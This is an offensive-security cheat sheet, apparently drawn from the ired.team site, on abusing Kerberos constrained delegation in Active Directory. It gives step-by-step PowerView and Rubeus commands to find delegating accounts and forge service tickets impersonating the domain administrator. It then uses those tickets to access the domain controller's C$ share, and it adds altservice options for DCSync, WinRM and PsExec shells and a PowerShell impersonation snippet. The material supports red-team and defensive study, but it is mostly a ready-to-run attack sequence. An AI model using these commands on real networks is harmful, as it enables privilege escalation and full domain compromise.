# Kerberos Constrained Delegation

Source: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation

## Overview

If a user account or computer has **Kerberos Constrained Delegation** enabled, an attacker can impersonate any domain user and authenticate to services the account is trusted to delegate to.

## User Account

### Find Delegating Users
```powershell
Get-NetUser -TrustedToAuth
```

Key attributes:
- `TRUSTED_TO_AUTH_FOR_DELEGATION` — UAC flag enabling delegation
- `msds-allowedtodelegateto` — lists SPNs user can delegate to

### Execution

**1. Get delegation TGT**
```powershell
Rubeus.exe tgtdeleg
```

**2. Request TGS impersonating Domain Admin**
```powershell
Rubeus.exe s4u /ticket:<base64-tgt> /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
```

**3. Verify access**
```powershell
dir \\dc01.offense.local\c$
```

**Additional services with /altservice**:
- `HTTP` → WinRM
- `LDAP` → DCSync
- `HOST` → PsExec shell
- `MSSQLSvc` → DB admin

## Computer Account (SYSTEM level)

### Find Delegating Computers
```powershell
Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
```

### Impersonation via Reflection
```powershell
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
ls \\dc01.offense.local\c$
```

## References
- https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- https://support.microsoft.com/en-gb/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties
- MITRE ATT&CK T1558
